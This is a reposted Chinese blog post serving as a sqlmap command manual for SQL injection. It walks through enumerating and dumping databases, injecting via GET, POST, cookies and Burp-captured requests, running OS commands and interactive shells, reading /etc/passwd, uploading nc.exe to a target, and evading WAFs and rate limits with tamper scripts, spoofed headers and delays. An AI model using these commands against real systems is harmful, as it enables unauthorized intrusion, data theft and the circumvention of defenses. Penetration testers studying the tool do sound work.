---
layout: post
title: "[转]【tools】SQLMAP注入工具手册"
description: ""
category: 
tags: [sql]
---

转自:<https://sh4dow.lofter.com/post/395c80_121497d>

# 基本的注入步骤：

    sqlmap -u "https://url/news?id=1" --dbs           #查询所有数据库
    sqlmap -u "https://url/news?id=1" --current-db          #获取当前数据库名
    sqlmap -u "https://url/news?id=1" --current-user        #获取当前用户名
    sqlmap -u "https://url/news?id=1" -D "db_name" --tables    #获取表名
    sqlmap -u "https://url/news?id=1" -D "db_name" -T "table_name"  --columns #获取列名
    sqlmap -u "https://url/news?id=1"  -D "db_name" -T "table_name" -C "column_name" --dump  #获取字段内容

注入请求选项使用：

    sqlmap -u "https://url/news?id=1"               #get注入
    sqlmap -u "https://url/news" --date "id=1"        #post注入
    sqlmap -u "https://url/news" --cookie "id=1"      #cookie注入

# 结合BurpSuite拦截的POST表单注入：

浏览器打开目标地址 https://testasp.vulnweb.com/Login.asp

配置burp代理(127.0.0.1:8080)以拦截请求

点击login表单的submit按钮

如下图，这时候Burp会拦截到了我们的登录POST请求

![](/assets/imgs/2015-08-18-01.jpg)

5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下

6. 运行sqlmap并使用如下命令：./sqlmap.py -r search-test.txt -p tfUPass，这里参数 -r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。

# POST登陆框注入：

    sqlmap -u https://testasp.vulnweb.com/Login.asp  --forms     #除了截包还可以用forms选项进行自动搜索表单
    sqlmap -u https://testasp.vulnweb.com/Login.asp  --date "tfUName=123$tfUPass=456" #POST的表单参数注入

# 应对伪静态指定注入点：

    sqlmap -u "https://url/news/1*.html" --dbs       #在*插入SQL注入语句查询数据库
    sqlmap -u "https://url/news/1*/html" --dbs       #在*插入SQL注入语句查询数据库


# 指定系统及数据库：

    sqlmap -u "https://url/news?id=1" --dbms PostgreSQL        #指定数据库
    sqlmap -u "https://url/news?id=1"  --os linux           #指定数据库服务器系统

# 命令执行及交互shell：

    sqlmap -u "https://url/news?id=1" --os-cmd=ipconfig     #执行ipconfig系统命令
    sqlmap -u "https://url/news?id=1" --os-shell            #写交互shell
    sqlmap -u "https://url/news?id=1"  --sql-query "show databases;"    #执行SQL语句          
    sqlmap -u "https://url/news?id=1"  --sql-shell            #返回SQLshell

# 文件操作：

    sqlmap -u "https://url/news?id=1"  --file-read  /etc/passwd    #读取系统文件
    sqlmap -u "https://url/news?id=1"  --file-write "C:/WINDOWS/Temp/nc.exe" --file-dest "/software/nc.exe" 

查看payload及注入语句：

    sqlmap -u "https://url/news?id=1"  -v 3   

#-v 0、只显示python错误以及严重的信息；

1、同时显示基本信息和警告信息；（默认）

2、同时显示debug信息；

3、同时显示注入的payload；

4、同时显示HTTP请求；

5、同时显示HTTP响应头；

6、同时显示HTTP响应页面。

    sqlmap -u "https://url/news?id=1"  --proxy "https://127.0.0.1:8080" #配置burp代理(127.0.0.1:8080)以拦截请求注入语句

# 测试等级对HTTP头注入利用：

    sqlmap -u "https://url/news?id=1" --level 3    #--level参数来进行不同全面性的测试，默认为1，不同的参数影响了使用哪些payload，2时会进行cookie注入检测，3时会进行useragent检测

# 风险等级：

--risk   #共有三个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。

# 盲注添加payload语句前缀与后缀绕过WAF：

    sqlmap -u "https://url/news?id=1" -p id --suffix=" -- " --prefix=")"    #相当于https://url/news?id=1）order by 10 -- 

# 编码绕过WAF：

    sqlmap -u "https://url/news?id=1" -v 3 --dbs --tamper "space2morehash.py"  #用tamper选择编码表绕过WAF注入，更多见ramper目录

# 伪装http头绕过工具识别：

    sqlmap -u "https://url/news?id=1" --referer "https://www.baidu.com"    #从百度域超链接访问的
    sqlmap -u "https://url/news?id=1" --user-agent="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" #设置浏览器信息
    sqlmap -u "https://url/news?id=1"  --mobile                 #伪装成智能手机，设定一个手机的User-Agent来模仿手机登陆

# 绕过HTTP请求限制：

    sqlmap -u "https://url/news?id=1"  --delay 2    #延迟时间为2秒，绕过请求频繁被防火墙拦截
    sqlmap -u "https://url/news?id=1"  --safe-url       #每隔一段时间去访问一个正常的页面，绕过多次错误访问后屏蔽请求
    sqlmap -u "https://url/news?id=1"  --safe-freq    #每次测试请求之后都再访问一遍安全连接，绕过多次错误访问后屏蔽请求

# 绕过URL参数值编码：

    sqlmap -u "https://url/news?id=1" --skip-urlencode   #关闭url编码，使web服务器接受url值

# 从文本中获取多个目标检测：

www.target1.com/vuln1.php?q=foobar

www.target2.com/vuln2.asp?id=1

www.target3.com/vuln3/id/1*               

    sqlmap -m  url.txt                       #将url格式保存到文件，sqlmap会逐一检测

# 启发式判断注入：

    sqlmap -u "https://url/news?id=1"  --batch --smart  #默认智能判断注入
